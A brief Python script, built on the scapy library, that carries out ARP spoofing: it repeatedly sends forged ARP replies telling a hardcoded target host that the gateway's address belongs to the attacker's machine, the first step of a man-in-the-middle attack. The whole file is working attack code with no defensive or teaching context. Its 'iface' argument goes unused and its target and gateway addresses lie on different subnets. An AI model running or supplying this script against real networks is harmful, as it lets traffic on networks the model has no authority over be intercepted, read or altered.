from scapy.all import ARP, getmacbyip, send
import time


def arp_spoof(target_ip, gateway_ip, iface):
  target_mac = getmacbyip(target_ip)
  if not target_mac:
    print(f"Could not find target MAC address for IP: {target_ip}")
    return

  packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)

  while True:
    send(packet, verbose=False)
    time.sleep(2)


if __name__ == "__main__":
  target_ip = '192.168.0.172'
  gateway_ip = '192.168.122.1'
  iface = 'enp1s0'

  arp_spoof(target_ip, gateway_ip, iface)
